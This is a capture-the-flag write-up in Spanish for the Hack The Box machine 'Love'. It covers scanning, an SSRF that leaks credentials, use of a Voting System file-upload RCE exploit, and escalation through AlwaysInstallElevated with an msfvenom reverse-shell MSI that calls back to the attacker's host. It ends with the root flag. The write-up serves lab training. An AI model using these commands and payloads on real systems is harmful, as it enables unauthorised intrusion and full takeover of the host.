#MACHINE LOVE
#Easy

## Skilss

```
Server Side Request Forgery (SSRF)
Exploiting Voting System
Abusing AlwaysInstallElevated (msiexec/msi file)

```

# RECONOCIMIENTO

```
└─# nmap -Pn -n -sVC -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 10.10.10.239 -oN target
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-07 22:09 EDT
Nmap scan report for 10.10.10.239
Host is up (0.19s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Voting System using PHP
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
| tls-alpn: 
|_  http/1.1
|_http-title: 403 Forbidden
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?
| fingerprint-strings: 
|   LDAPSearchReq, NotesRPC, RPCCheck, RTSPRequest, TerminalServer: 
|_    Host '10.10.14.4' is not allowed to connect to this MariaDB server
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2024-07-08T02:34:26+00:00; +21m35s from scanner time.
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.94SVN%I=7%D=7/7%Time=668B4A7E%P=x86_64-pc-linux-gnu%r(
SF:RTSPRequest,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.4'\x20is\x20not\
SF:x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RPCC
SF:heck,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.4'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LDAPSearchR
SF:eq,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.4'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TerminalServe
SF:r,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.4'\x20is\x20not\x20allowed
SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(NotesRPC,49,"E
SF:\0\0\x01\xffj\x04Host\x20'10\.10\.14\.4'\x20is\x20not\x20allowed\x20to\
SF:x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-07-08T02:34:12
|_  start_date: N/A
|_clock-skew: mean: 21m35s, deviation: 0s, median: 21m35s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 181.24 seconds
                                                              
```

```
└─# whatweb http://10.10.10.239
http://10.10.10.239 [200 OK] Apache[2.4.46], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27], IP[10.10.10.239], JQuery, OpenSSL[1.1.1j], PHP[7.3.27], PasswordField[password], Script, Title[Voting System using PHP], X-Powered-By[PHP/7.3.27], X-UA-Compatible[IE=edge]

```

### En el nmap en el puerto 443 se descubre este URL `staging.love.htb` yendo a la URL se pueden hacer peticiones a URL, se realiza una peticion a la URL `localhost:5000`    que es un puerto abierto que podemos ver

### al momento de realizar la peticion observamos un usuario y un pass

### teniendo las credenciales con `searchsploit` buscamos los exploit que hayan de Voting System

```
└─# searchsploit Voting System 
----------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                   |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Online Voting System - Authentication Bypass                                                                                                                     | php/webapps/43967.py
Online Voting System 1.0 - Authentication Bypass (SQLi)                                                                                                          | php/webapps/50075.txt
Online Voting System 1.0 - Remote Code Execution (Authenticated)                                                                                                 | php/webapps/50076.txt
Online Voting System 1.0 - SQLi (Authentication Bypass) + Remote Code Execution (RCE)                                                                            | php/webapps/50088.py
Online Voting System Project in PHP - 'username' Persistent Cross-Site Scripting                                                                                 | multiple/webapps/49159.txt
Voting System 1.0 - Authentication Bypass (SQLI)                                                                                                                 | php/webapps/49843.txt
Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)                                                                                        | php/webapps/49445.py
Voting System 1.0 - Remote Code Execution (Unauthenticated)                                                                                                      | php/webapps/49846.txt
Voting System 1.0 - Time based SQLI  (Unauthenticated SQL injection)                                                                                             | php/webapps/49817.txt
WordPress Plugin Poll_ Survey_ Questionnaire and Voting system 1.5.2 - 'date_answers' Blind SQL 

```

```
└─# searchsploit -m 49445   
  Exploit: Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)
      URL: https://www.exploit-db.com/exploits/49445
     Path: /usr/share/exploitdb/exploits/php/webapps/49445.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable, with very long lines (6002)
Copied to: /home/kali/Documents/htb/love/content/49445.py


```

### Descargamos el exploit modificamos las urls y las ips de solicitud y realizamos el acceso inicial con ayuda de este

```
─# rlwrap -cAr nc -lvnp 4444                                                     
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.239] 56206
b374k shell : connected

Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\omrs\images>whoami
whoami
love\phoebe


```

### Capturamos la bandera de usuario y despues para hacer el escalamiento de privilegios

### con ayuda de winpeas detectamos la vulnerabilidades.,


![]https://github.com/peass-ng/PEASS-ng


```
����������͹ Checking AlwaysInstallElevated
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated                                                                                       
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!


```

[]!https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated


### !NO COLOCAR METERPRER

```
└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4443  --platform windows -a x64 -f msi -o rshell.msi
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: rshell.msi

```

```
─# rlwrap nc -lvnp 4443                                                          
listening on [any] 4443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.239] 56227
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system

C:\WINDOWS\system32>type c:\Users\Administrator\Desktop\root.txt
type c:\Users\Administrator\Desktop\root.txt
5fc9554e27ed855207613edff1a01011


```
